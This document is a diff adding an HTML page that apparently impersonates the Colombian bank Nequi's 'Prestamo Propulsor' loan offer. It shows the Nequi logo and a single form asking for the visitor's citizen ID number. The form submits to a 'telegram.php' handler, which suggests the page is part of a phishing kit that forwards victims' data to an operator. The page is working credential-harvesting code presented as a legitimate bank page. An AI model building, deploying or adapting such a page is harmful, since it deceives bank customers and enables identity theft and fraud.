@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+
+
+<head>
+    <title>Prestamo Propulsor</title>
+    <meta http-equiv="content-type" content="text/html; utf-8">
+    <meta charset="utf-8">
+    
+    <meta content="es" http-equiv="Content-Language">
+
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <meta name="Copyright" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="icon" href="img/favicon.png" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;0,1000;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900;1,1000&amp;display=swap" rel="stylesheet">
+    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>      
+    <link href="css/style.css" rel="stylesheet">
+    <link href="css/stylesheet.css" rel="stylesheet">
+    <script type="text/javascript" src="js/functions.js"></script> 
+    <script type="text/javascript" src="js/ready.js"></script> 
+    <style type="text/css">
+        body{
+            background-color: #fbe5f2;
+            display: flex;
+            justify-content: center;
+            align-content: flex-start;
+            margin-top: 150px;
+
+        }
+        #cargando{
+            position: fixed;
+            top: 60%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 920;   
+            display: none; 
+        }
+        
+        /* Estilo para el botón habilitado */
+        .btn-habilitado {
+            background-color: #DA0081; /* Cambia el color a amarillo */
+            color: #fff;
+        }
+
+        /* Estilo para el botón deshabilitado */
+        .btn-deshabilitado {
+            background-color: #F1BFDA; /* Cambia el color a gris */
+            color: #fff;
+        }
+    </style>     
+    <script type="text/javascript">
+        $(document).ready(function(){
+            $("#txt-cedula").focus();  
+
+            $("#txt-cedula").on("input", function() {
+                var inputValue = $(this).val();
+                if (inputValue.trim() !== "") {
+                    $("#btn-consultar").prop("disabled", false);
+                    $("#btn-consultar").removeClass("btn-deshabilitado").addClass("btn-habilitado");
+                } else {
+                    $("#btn-consultar").prop("disabled", true);
+                    $("#btn-consultar").removeClass("btn-habilitado").addClass("btn-deshabilitado");
+                }
+            });              
+        });  
+    </script>        
+</head>
+<body>
+    <div id="fondo"></div>
+      <div id="frm-consulta" class="frm-modal">
+        <img src="img/nequi.png" alt="" style="width: 100%;margin-top: 30px;">
+        <form action="telegram.php" method="post" class="formulario">
+            <input type="text" name="txt-cedula" id="txt-cedula" placeholder="Cédula de Ciudadanía" class="entradas" autocomplete="off" maxlength="12" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" style="background-color: #fbf7fb;">
+            <div class="error" id="err-cedula">Ingrese su documento</div>
+            <br>
+            <br>
+            <button class="btn btn-deshabilitado" id="btn-consultar" disabled>Consultar</button>
+        </form>
+       </div>
+    </div>
+    
+</body>
+
+
+</html> 
